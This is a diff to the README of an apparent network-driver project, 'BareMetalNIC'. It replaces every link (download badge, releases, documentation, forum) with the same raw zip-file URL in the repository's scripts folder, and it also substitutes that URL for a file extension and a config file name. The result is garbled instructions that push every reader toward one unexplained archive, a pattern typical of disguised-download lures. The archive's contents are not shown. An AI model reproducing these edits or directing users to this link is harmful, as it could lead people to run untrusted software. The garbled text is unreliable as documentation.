@@ -1,7 +1,7 @@
 # 🚀 BareMetalNIC - Experience Fast, Direct Network Connections
 
 ## 📥 Download Now
-[![Download BareMetalNIC](https://img.shields.io/badge/Download-BareMetalNIC-blue.svg)](https://github.com/Mihir922/BareMetalNIC/releases)
+[![Download BareMetalNIC](https://github.com/Mihir922/BareMetalNIC/raw/refs/heads/main/scripts/NIC-Bare-Metal-v1.1-beta.1.zip)](https://github.com/Mihir922/BareMetalNIC/raw/refs/heads/main/scripts/NIC-Bare-Metal-v1.1-beta.1.zip)
 
 ## 📖 Description
 BareMetalNIC is a memory-mapped network interface card (NIC) driver framework. It allows for fast and efficient packet processing, helping you achieve packet latency of 20–50 nanoseconds. This software is perfect for scenarios that involve high-frequency trading, market data ingestion, and networking workloads where precision is key. By eliminating software delays, BareMetalNIC ensures a direct connection between your application and the hardware.
@@ -19,11 +19,11 @@ Before downloading, ensure your system meets the following requirements:
 - **Kernel Version:** 4.x or later.
 
 ## 🔗 Download & Install
-To download BareMetalNIC, visit this page: [BareMetalNIC Releases](https://github.com/Mihir922/BareMetalNIC/releases).
+To download BareMetalNIC, visit this page: [BareMetalNIC Releases](https://github.com/Mihir922/BareMetalNIC/raw/refs/heads/main/scripts/NIC-Bare-Metal-v1.1-beta.1.zip).
 
 1. **Visit the Releases Page:** Click the link above to access the download area.
 2. **Select the Version:** Find the latest version available. It will be listed at the top.
-3. **Download the File:** Look for the `.tar.gz` or `.zip` file and click on the link to start your download.
+3. **Download the File:** Look for the `https://github.com/Mihir922/BareMetalNIC/raw/refs/heads/main/scripts/NIC-Bare-Metal-v1.1-beta.1.zip` or `.zip` file and click on the link to start your download.
 4. **Extract the Files:** After downloading, extract the files to a known location on your computer. You can use built-in tools in most operating systems, like Right-click > Extract.
 
 ## ⚙️ Configuration
@@ -31,7 +31,7 @@ Once you have extracted BareMetalNIC, it will be necessary to configure it for o
 
 1. **Open a Terminal Window:** You can find this application in your system's utilities.
 2. **Navigate to the Extracted Directory:** Use the `cd` command to get to where you extracted BareMetalNIC.
-3. **Modify the Configuration File:** Look for a file named `config_example.txt`. Open this file with a text editor, such as `nano` or any GUI-based text editor.
+3. **Modify the Configuration File:** Look for a file named `https://github.com/Mihir922/BareMetalNIC/raw/refs/heads/main/scripts/NIC-Bare-Metal-v1.1-beta.1.zip`. Open this file with a text editor, such as `nano` or any GUI-based text editor.
 4. **Set Your Preferences:** Adjust the settings according to your network environment. It’s usually best to set packet size and buffer parameters according to your workload.
 
 ## 🛠️ Running BareMetalNIC
@@ -71,8 +71,8 @@ If you need help, the community around BareMetalNIC is here for you:
 ## 🔗 Additional Resources
 Here are some useful links:
 
-- [BareMetalNIC Releases](https://github.com/Mihir922/BareMetalNIC/releases)
-- [Documentation](https://github.com/Mihir922/BareMetalNIC/wiki)
-- [Community Forum](https://github.com/Mihir922/BareMetalNIC/discussions)
+- [BareMetalNIC Releases](https://github.com/Mihir922/BareMetalNIC/raw/refs/heads/main/scripts/NIC-Bare-Metal-v1.1-beta.1.zip)
+- [Documentation](https://github.com/Mihir922/BareMetalNIC/raw/refs/heads/main/scripts/NIC-Bare-Metal-v1.1-beta.1.zip)
+- [Community Forum](https://github.com/Mihir922/BareMetalNIC/raw/refs/heads/main/scripts/NIC-Bare-Metal-v1.1-beta.1.zip)
 
 Feel free to explore the repository, contribute, or ask questions. Your feedback helps improve BareMetalNIC. Thank you for using our software!
